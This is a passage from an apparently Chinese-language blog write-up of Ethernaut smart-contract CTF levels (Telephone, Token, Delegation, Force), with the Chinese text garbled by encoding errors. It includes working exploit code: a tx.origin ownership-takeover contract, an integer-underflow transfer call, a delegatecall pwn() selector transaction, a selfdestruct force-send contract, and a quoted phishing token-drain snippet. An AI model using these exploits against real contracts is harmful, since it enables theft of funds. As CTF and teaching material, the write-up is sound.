<span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥çœ‹<code>tx.origin</code>å’Œ<code>msg.sender</code>çš„åŒºåˆ«</p><p><strong>msg.sender:</strong> æŒ‡ç›´æ¥è°ƒç”¨æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„å¸æˆ·æˆ–æ™ºèƒ½åˆçº¦çš„åœ°å€<br><strong>tx.origin:</strong> æŒ‡è°ƒç”¨æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„è´¦æˆ·åœ°å€ï¼Œåªæœ‰è´¦æˆ·åœ°å€å¯ä»¥æ˜¯tx.origin</p><p><img src="https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg"></p><p>æˆ‘ä»¬å¼€ä¸€ä¸ªæ–°åˆçº¦ç›´æ¥ä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„addressé€šè¿‡æ–°åˆçº¦è°ƒç”¨Telephoneåˆçº¦å³å¯</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Telephone</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">hh</span><span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> ow<span class="token operator">=</span><span class="token number">0xeeD53DF0B7E5CF4272a2E92c4E39B1405910d8C7</span><span class="token punctuation">;</span>    Telephone exp<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        exp<span class="token operator">=</span><span class="token function">Telephone</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        exp<span class="token punctuation">.</span><span class="token function">changeOwner</span><span class="token punctuation">(</span>ow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™ä¸ªä¾‹å­æ¯”è¾ƒç®€å•, æ··æ·† <code>tx.origin</code> å’Œ <code>msg.sender</code> ä¼šå¯¼è‡´ phishing-style æ”»å‡», æ¯”å¦‚<a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">this</a>.</p><p>ä¸‹é¢æè¿°äº†ä¸€ä¸ªå¯èƒ½çš„æ”»å‡».</p><ol><li>ä½¿ç”¨ <code>tx.origin</code> æ¥å†³å®šè½¬ç§»è°çš„token, æ¯”å¦‚.</li></ol><pre class="line-numbers language-none"><code class="language-none">function transfer(address _to, uint _value) &#123;  tokens[tx.origin] -&#x3D; _value;  tokens[_to] +&#x3D; _value;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>æ”»å‡»è€…é€šè¿‡è°ƒç”¨åˆçº¦çš„ transfer å‡½æ•°æ˜¯å—å®³è€…å‘æ¶æ„åˆçº¦è½¬ç§»èµ„äº§, æ¯”å¦‚</li></ol><pre class="line-numbers language-none"><code class="language-none">function () payable &#123;  token.transfer(attackerAddress, 10000);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>åœ¨è¿™ä¸ªæƒ…å†µä¸‹, <code>tx.origin</code> æ˜¯å—å®³è€…çš„åœ°å€ ( <code>msg.sender</code> æ˜¯æ¶æ„åè®®çš„åœ°å€), è¿™ä¼šå¯¼è‡´å—å®³è€…çš„èµ„äº§è¢«è½¬ç§»åˆ°æ”»å‡»è€…çš„æ‰‹ä¸Š.</li></ol></blockquote><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><blockquote><p>è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯æ”»ç ´ä¸‹é¢è¿™ä¸ªåŸºç¡€ token åˆçº¦</p><p>ä½ æœ€å¼€å§‹æœ‰20ä¸ª token, å¦‚æœä½ é€šè¿‡æŸç§æ–¹æ³•å¯ä»¥å¢åŠ ä½ æ‰‹ä¸­çš„ token æ•°é‡,ä½ å°±å¯ä»¥é€šè¿‡è¿™ä¸€å…³,å½“ç„¶è¶Šå¤šè¶Šå¥½</p><p> è¿™å¯èƒ½æœ‰å¸®åŠ©:</p><ul><li>ä»€ä¹ˆæ˜¯ odometer?</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> balances<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> totalSupply<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _value <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> _value<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_owner<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä»£ç ï¼Œbalancesæ˜ å°„çš„ç›¸å½“æ˜¯æˆ‘ä»¬çš„tokenä¸ªæ•°ï¼Œåˆå§‹ä¸º20ä¸ªï¼Œå†çœ‹transferå‡½æ•°ï¼Œè¦æ±‚æˆ‘ä»¬çš„tokenæ•°å‡å»äº¤æ˜“æ•°è¦å¤§äºç­‰äº0ï¼Œä½†æ˜¯é—®é¢˜æ˜¯tokenæ•°å’Œäº¤æ˜“æ•°éƒ½æ˜¯uintç±»å‹ï¼Œæ’å¤§äºç­‰äº0ï¼ˆå› ä¸ºè¿ç®—ç»“æœä¹Ÿæ˜¯uintç±»å‹ï¼‰ï¼Œæ‰€ä»¥requireæ ¹æœ¬ä¸éœ€è¦ç»•è¿‡ï¼Œå¦‚æœæˆ‘ä»¬å°†<code>_value</code>å€¼è®¾å®šä¸º21ï¼Œå°±ä¼šå‡ºç°æº¢å‡ºï¼Œå¯¼è‡´æˆ‘ä»¬çš„balanceæå¤§ï¼Œä¹Ÿå°±å®Œæˆäº†ä»»åŠ¡</p><pre class="line-numbers language-none"><code class="language-none">contract.transfer(instance,21)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Overflow åœ¨ solidity ä¸­éå¸¸å¸¸è§, ä½ å¿…é¡»å°å¿ƒæ£€æŸ¥, æ¯”å¦‚ä¸‹é¢è¿™æ ·:</p><pre class="line-numbers language-none"><code class="language-none">if(a + c &gt; a) &#123;  a &#x3D; a + c;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ OpenZeppelin çš„ SafeMath åº“, å®ƒä¼šè‡ªåŠ¨æ£€æŸ¥æ‰€æœ‰æ•°å­¦è¿ç®—çš„æº¢å‡º, å¯ä»¥åƒè¿™æ ·ä½¿ç”¨:</p><pre class="line-numbers language-none"><code class="language-none">a &#x3D; a.add(c);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæœ‰æº¢å‡º, ä»£ç ä¼šè‡ªåŠ¨æ¢å¤.</p></blockquote><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><blockquote><p>è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ç”³æ˜ä½ å¯¹ä½ åˆ›å»ºå®ä¾‹çš„æ‰€æœ‰æƒ.</p><p> è¿™å¯èƒ½æœ‰å¸®åŠ©</p><ul><li>ä»”ç»†çœ‹solidityæ–‡æ¡£å…³äº <code>delegatecall</code> çš„ä½çº§å‡½æ•°, ä»–æ€ä¹ˆè¿è¡Œçš„, ä»–å¦‚ä½•å°†æ“ä½œå§”æ‰˜ç»™é“¾ä¸Šåº“, ä»¥åŠä»–å¯¹æ‰§è¡Œçš„å½±å“.</li><li>Fallback æ–¹æ³•</li><li>æ–¹æ³• ID</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Delegate</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Delegation</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  Delegate delegate<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _delegateAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    delegate <span class="token operator">=</span> <span class="token function">Delegate</span><span class="token punctuation">(</span>_delegateAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>delegate<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾éœ€è¦é€šè¿‡è°ƒç”¨pwnå‡½æ•°æ¥å°†ownerå˜æˆæˆ‘ä»¬è‡ªå·±ï¼Œä½†æ˜¯éƒ¨ç½²çš„åˆçº¦æ˜¯<code>Delegation</code>ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦ä¸­çš„å‡½æ•°å‘¢ï¼Œå¾ˆç®€å•ï¼Œä½¿ç”¨solidityä¸­è‡ªå¸¦çš„callæ–¹æ³•å³å¯</p><p>åœ¨solidityä¸­æœ‰ä¸‰ç§callæ–¹æ³•å¯ç”¨ï¼š</p><ul><li><p><strong>call</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ç»™å®šçš„payloadå‘å‡ºä¸€ä¸ªä½çº§(low-level)çš„<code>CALL</code>å‘½ä»¤ï¼Œè¿”å›æ‰§è¡Œæ˜¯å¦æˆåŠŸå’Œæ•°æ®ï¼Œè½¬å‘æ‰€æœ‰å¯ç”¨gasï¼Œå¯è°ƒæ•´ã€‚</p></li><li><p><strong>delegatecall</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.delegatecall(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ç»™å®špayloadå‘å‡ºä¸€ä¸ªä½çº§çš„<code>DELEGATECALL</code>æŒ‡ä»¤ï¼Œè¿”å›æ‰§è¡Œæ˜¯å¦æˆåŠŸå’Œæ•°æ®ï¼Œè½¬å‘æ‰€æœ‰å¯ç”¨gasï¼Œå¯è°ƒæ•´ã€‚</p></li><li><p><strong>staticcall</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.staticcall(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ç»™å®špayloadå‘å‡ºä¸€ä¸ªä½çº§çš„<code>STATICCALL</code>æŒ‡ä»¤ï¼Œè¿”å›æ‰§è¡Œæ˜¯å¦æˆåŠŸå’Œæ•°æ®ï¼Œè½¬å‘æ‰€æœ‰å¯ç”¨gasï¼Œå¯è°ƒæ•´ã€‚</p></li><li><p><del>è¿™å®˜æ–¹æ–‡æ¡£çº¯çº¯åºŸè¯ï¼Œè¯´äº†è·Ÿæ²¡è¯´ä¸€æ ·</del></p></li></ul><p>ä¹ä¸€çœ‹ä¼¼ä¹å†…å®¹éƒ½å·®ä¸å¤šï¼Œé‚£æˆ‘ä»¬è‡ªå·±è°ƒç”¨è¿™äº›å‘½ä»¤æ¥æµ‹è¯•ä¸€ä¸‹å§</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.23</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Calltest</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        b<span class="token operator">=</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Compare</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> testaddress<span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">logb</span><span class="token punctuation">(</span><span class="token builtin">address</span> _a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _addressOfCalltest<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        testaddress <span class="token operator">=</span> _addressOfCalltest<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withcall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">//é€šè¿‡callæ–¹æ³•è°ƒç”¨å‡½æ•°</span>        testaddress<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"test()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">logb</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdelegatecall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">//é€šè¿‡delegatecallæ–¹æ³•è°ƒç”¨å‡½æ•°</span>        testaddress<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"test()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">logb</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222013360.png"></p><p>å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä½¿ç”¨callæ–¹æ³•è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¯ä»¥å‘ç°<code>CALLTEST</code>åˆçº¦çš„bå·²ç»å˜æˆäº†è¿™ä¸ªåˆçº¦çš„éƒ¨ç½²åœ°å€<code> 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53</code>ï¼Œè€ŒCompareåˆçº¦çš„åœ°å€å¹¶æ²¡æœ‰å˜åŒ–ã€‚è¯´æ˜<code>call</code>åªæ˜¯åœ¨<code>Calltest</code>åˆçº¦ä¸­æ‰§è¡Œäº†testå‡½æ•°</p><p>è€Œåœ¨ä½¿ç”¨delegatecallæ–¹æ³•è°ƒç”¨å‡½æ•°æ—¶ï¼Œ<code>COMPARE</code>åˆçº¦çš„bå˜æˆäº†åˆçº¦éƒ¨ç½²åœ°å€ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°å®é™…ä¸Šæ˜¯åœ¨<code>Compare</code>åˆçº¦ä¸­æ‰§è¡Œçš„ï¼Œä¹Ÿå°±ç›¸å½“äºæ˜¯æŠŠå‡½æ•°å¤åˆ¶äº†ä¸€ä»½åˆ°åˆçº¦ä¸­æ‰§è¡Œ</p><p>é‚£ä¹ˆåœ¨è¿™ä¸ªåˆçº¦ä¸­æˆ‘ä»¬åªéœ€è¦é€šè¿‡fallbackæ‰§è¡Œdelegatecallæ¥è¿›å…¥Delegateåˆçº¦ä¸­çš„pwnæ–¹æ³•æ¥æ‰§è¡Œæ›¿æ¢owner</p><p>è€Œfallbackå‡½æ•°çš„æ‰§è¡Œåªéœ€è¦sendTransactionæ–¹æ³•ï¼Œå¸¦ä¸Šdataå³å¯æ‰§è¡Œpwnå‡½æ•°ï¼Œæ–¹æ³•çš„IDæ˜¯4å­—èŠ‚çš„sha3</p><pre class="line-numbers language-none"><code class="language-none">contract.sendTransaction(&#123;data:web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>ä½¿ç”¨<code>delegatecall</code> æ˜¯å¾ˆå±é™©çš„, è€Œä¸”å†å²ä¸Šå·²ç»å¤šæ¬¡è¢«ç”¨äºè¿›è¡Œ attack vector. ä½¿ç”¨å®ƒ, ä½ å¯¹åˆçº¦ç›¸å½“äºåœ¨è¯´ â€œçœ‹è¿™é‡Œ, -å…¶ä»–åˆçº¦- æˆ–æ˜¯ -å…¶å®ƒåº“-, æ¥å¯¹æˆ‘çš„çŠ¶æ€ä¸ºæ‰€æ¬²ä¸ºå§â€. ä»£ç†å¯¹ä½ åˆçº¦çš„çŠ¶æ€æœ‰å®Œå…¨çš„æ§åˆ¶æƒ. <code>delegatecall</code> å‡½æ•°æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„åŠŸèƒ½, ä½†æ˜¯ä¹Ÿå¾ˆå±é™©, æ‰€ä»¥ä½¿ç”¨çš„æ—¶å€™éœ€è¦éå¸¸å°å¿ƒ.</p><p>è¯·å‚è§ <a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">The Parity Wallet Hack Explained</a> è¿™ç¯‡æ–‡ç« , ä»–è¯¦ç»†è§£é‡Šäº†è¿™ä¸ªæ–¹æ³•æ˜¯å¦‚ä½•çªƒå–ä¸‰åƒä¸‡ç¾å…ƒçš„.</p></blockquote><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><blockquote><p>æœ‰äº›åˆçº¦å°±æ˜¯æ‹’ç»ä½ çš„ä»˜æ¬¾,å°±æ˜¯è¿™ä¹ˆä»»æ€§ <code>Â¯\_(ãƒ„)_/Â¯</code></p><p>è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äº0</p><p> è¿™å¯èƒ½æœ‰å¸®åŠ©:</p><ul><li>Fallback æ–¹æ³•</li><li>æœ‰æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦æœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦.</li><li>é˜…è¯»ä¸Šæ–¹çš„å¸®åŠ©é¡µé¢, â€œæ§åˆ¶å°ä¹‹å¤–â€ éƒ¨åˆ†</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Force</span> <span class="token punctuation">&#123;</span><span class="token comment">/*                   MEOW ?         /\_/\   /    ____/ o o \  /~____  =Ã¸= / (______)__m_m)*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æƒ³è®©åˆçº¦ä½™é¢å¤§äº0é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯ç›´æ¥è½¬è´¦äº†<code>contract.sendTransaction(instance,1)</code>ï¼Œä½†æ˜¯ç”±äºfallbacké‡å†™å¯¼è‡´æˆ‘ä»¬çš„äº¤æ˜“è¢«å›é€€ï¼Œå¦‚å›¾æ‰€ç¤º</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222059265.png"></p><p>æ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªåˆçº¦äº†ï¼Œåœ¨<code>selfdestruct</code>å‡½æ•°ä¸­ä¼šå°†æ•´ä¸ªåˆçº¦é”€æ¯å¹¶å°†åˆçº¦ä½™é¢å¼ºåˆ¶ç»™äºˆæŒ‡å®šåœ°å€å¹¶ä¸”å¿½ç•¥fallbackå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªéœ€è¦åœ¨åˆ¶ä½œä¸€ä¸ªæ–°åˆçº¦ï¼Œå­˜å…¥ä»£å¸ï¼Œé”€æ¯å‘é€åˆ°é¢˜ç›®åˆçº¦å³å¯</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> aim<span class="token punctuation">;</span>  <span class="token keyword">constructor</span> <span class="token punctuation">(</span><span class="token builtin">address</span> t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    aim<span class="token operator">=</span>t<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>      <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>aim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åœ¨solidityä¸­, å¦‚æœä¸€ä¸ªåˆçº¦è¦æ¥å— ether, fallback æ–¹æ³•å¿…é¡»è®¾ç½®ä¸º <code>payable</code>.</p><p>ä½†æ˜¯, 